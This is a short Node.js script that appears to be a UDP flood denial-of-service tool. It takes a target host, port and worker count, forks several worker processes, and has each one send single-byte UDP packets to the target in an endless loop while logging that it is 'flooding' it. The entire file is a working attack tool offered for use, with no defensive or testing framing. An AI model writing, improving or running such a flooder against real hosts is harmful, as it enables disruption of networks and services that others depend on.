var dgram = require("dgram"),
    client = dgram.createSocket('udp4'),
    Commander  = require('commander'),
    cluster = require('cluster'),
    os = require('os'),
    q = require('q');
    
var commander = Commander
  .option('-h, --host <host>', 'Host Name/IP.', String)
  .option('-w, --workers <workers>', 'Worker count.', parseInt)
  .option('-p, --port <port>', 'Port number.', parseInt)
  .option('-s, --silent', 'Silence packet count logging.')
  .parse(process.argv);


require('./q-flow');

var port = commander.port || Math.floor(Math.random() * (65553) + 1);
var workers = commander.workers || os.cpus().length + 1;

function sendOne(ip, port){
  return new Promise(function(resolve, reject){
    var msg = new Buffer('X');
    client.send(msg, 0, msg.length, port, ip, function(err){
      return err ? reject(err) : resolve();
    });
  });
}

function runWorker(){
  var packetsSent = 0;
  console.log('flooding', commander.host, 'with UDP packets on port', port);
  
  q.until(function() {
    return q.delay(0)
    .then(function(){
      return sendOne(commander.host, port);
    })
    .then(function() {
      packetsSent++;
      if(!commander.silent) console.log('packets sent', packetsSent);
      return false;
    });
  }).done(function() {
    return console.log('done');
  });
}
if(!commander.host) return console.log('No host specified. Exiting.');

if(cluster.isMaster){
  for (var i = 0; i < workers; i++) {
    console.log('started worker', i + 1);
    cluster.fork();
  }
  
  cluster.on('exit', function(worker, code, signal) {
    console.log('worker ' + worker.process.pid + ' died');
  });
  
}else{
  runWorker();
}
